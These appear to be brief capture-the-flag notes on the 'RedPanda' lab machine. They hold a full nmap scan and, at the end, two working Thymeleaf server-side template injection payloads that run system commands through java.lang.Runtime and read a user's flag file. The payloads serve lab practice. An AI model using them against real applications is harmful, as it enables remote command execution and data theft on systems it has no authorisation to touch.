# RedPanda

## IP = 10.10.11.170

## Nmap

### Initial
```
# Nmap 7.92 scan initiated Fri Aug  5 05:36:07 2022 as: nmap -sC -sV -oN nmap/initial 10.10.11.170
Nmap scan report for 10.10.11.170
Host is up (0.079s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
8080/tcp open  http-proxy
|_http-title: Red Panda Search | Made with Spring Boot
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 
|     Content-Type: text/html;charset=UTF-8
|     Content-Language: en-US
|     Date: Fri, 05 Aug 2022 09:36:24 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en" dir="ltr">
|     <head>
|     <meta charset="utf-8">
|     <meta author="wooden_k">
|     <!--Codepen by khr2003: https://codepen.io/khr2003/pen/BGZdXw -->
|     <link rel="stylesheet" href="css/panda.css" type="text/css">
|     <link rel="stylesheet" href="css/main.css" type="text/css">
|     <title>Red Panda Search | Made with Spring Boot</title>
|     </head>
|     <body>
|     <div class='pande'>
|     <div class='ear left'></div>
|     <div class='ear right'></div>
|     <div class='whiskers left'>
|     <span></span>
|     <span></span>
|     <span></span>
|     </div>
|     <div class='whiskers right'>
|     <span></span>
|     <span></span>
|     <span></span>
|     </div>
|     <div class='face'>
|     <div class='eye
|   HTTPOptions: 
|     HTTP/1.1 200 
|     Allow: GET,HEAD,OPTIONS
|     Content-Length: 0
|     Date: Fri, 05 Aug 2022 09:36:24 GMT
|     Connection: close
|   RTSPRequest: 
|     HTTP/1.1 400 
|     Content-Type: text/html;charset=utf-8
|     Content-Language: en
|     Content-Length: 435
|     Date: Fri, 05 Aug 2022 09:36:24 GMT
|     Connection: close
|     <!doctype html><html lang="en"><head><title>HTTP Status 400 
|     Request</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 400 
|_    Request</h1></body></html>
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8080-TCP:V=7.92%I=7%D=8/5%Time=62ECE499%P=x86_64-pc-linux-gnu%r(Get
SF:Request,690,"HTTP/1\.1\x20200\x20\r\nContent-Type:\x20text/html;charset
SF:=UTF-8\r\nContent-Language:\x20en-US\r\nDate:\x20Fri,\x2005\x20Aug\x202
SF:022\x2009:36:24\x20GMT\r\nConnection:\x20close\r\n\r\n<!DOCTYPE\x20html
SF:>\n<html\x20lang=\"en\"\x20dir=\"ltr\">\n\x20\x20<head>\n\x20\x20\x20\x
SF:20<meta\x20charset=\"utf-8\">\n\x20\x20\x20\x20<meta\x20author=\"wooden
SF:_k\">\n\x20\x20\x20\x20<!--Codepen\x20by\x20khr2003:\x20https://codepen
SF:\.io/khr2003/pen/BGZdXw\x20-->\n\x20\x20\x20\x20<link\x20rel=\"styleshe
SF:et\"\x20href=\"css/panda\.css\"\x20type=\"text/css\">\n\x20\x20\x20\x20
SF:<link\x20rel=\"stylesheet\"\x20href=\"css/main\.css\"\x20type=\"text/cs
SF:s\">\n\x20\x20\x20\x20<title>Red\x20Panda\x20Search\x20\|\x20Made\x20wi
SF:th\x20Spring\x20Boot</title>\n\x20\x20</head>\n\x20\x20<body>\n\n\x20\x
SF:20\x20\x20<div\x20class='pande'>\n\x20\x20\x20\x20\x20\x20<div\x20class
SF:='ear\x20left'></div>\n\x20\x20\x20\x20\x20\x20<div\x20class='ear\x20ri
SF:ght'></div>\n\x20\x20\x20\x20\x20\x20<div\x20class='whiskers\x20left'>\
SF:n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<span></span>\n\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20<span></span>\n\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20<span></span>\n\x20\x20\x20\x20\x20\x20</div>\n\x20\x20\x20\x2
SF:0\x20\x20<div\x20class='whiskers\x20right'>\n\x20\x20\x20\x20\x20\x20\x
SF:20\x20<span></span>\n\x20\x20\x20\x20\x20\x20\x20\x20<span></span>\n\x2
SF:0\x20\x20\x20\x20\x20\x20\x20<span></span>\n\x20\x20\x20\x20\x20\x20</d
SF:iv>\n\x20\x20\x20\x20\x20\x20<div\x20class='face'>\n\x20\x20\x20\x20\x2
SF:0\x20\x20\x20<div\x20class='eye")%r(HTTPOptions,75,"HTTP/1\.1\x20200\x2
SF:0\r\nAllow:\x20GET,HEAD,OPTIONS\r\nContent-Length:\x200\r\nDate:\x20Fri
SF:,\x2005\x20Aug\x202022\x2009:36:24\x20GMT\r\nConnection:\x20close\r\n\r
SF:\n")%r(RTSPRequest,24E,"HTTP/1\.1\x20400\x20\r\nContent-Type:\x20text/h
SF:tml;charset=utf-8\r\nContent-Language:\x20en\r\nContent-Length:\x20435\
SF:r\nDate:\x20Fri,\x2005\x20Aug\x202022\x2009:36:24\x20GMT\r\nConnection:
SF:\x20close\r\n\r\n<!doctype\x20html><html\x20lang=\"en\"><head><title>HT
SF:TP\x20Status\x20400\x20\xe2\x80\x93\x20Bad\x20Request</title><style\x20
SF:type=\"text/css\">body\x20{font-family:Tahoma,Arial,sans-serif;}\x20h1,
SF:\x20h2,\x20h3,\x20b\x20{color:white;background-color:#525D76;}\x20h1\x2
SF:0{font-size:22px;}\x20h2\x20{font-size:16px;}\x20h3\x20{font-size:14px;
SF:}\x20p\x20{font-size:12px;}\x20a\x20{color:black;}\x20\.line\x20{height
SF::1px;background-color:#525D76;border:none;}</style></head><body><h1>HTT
SF:P\x20Status\x20400\x20\xe2\x80\x93\x20Bad\x20Request</h1></body></html>
SF:");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Aug  5 05:36:39 2022 -- 1 IP address (1 host up) scanned in 31.75 seconds

```

### STTI in the search
Template engine: Thymeleaf
Exploit: `name=*{new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("id").getInputStream()).next()}`

Get user.txt: `name=*{new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("cat ../../../../../../home/woodenk/user.txt").getInputStream()).next()}`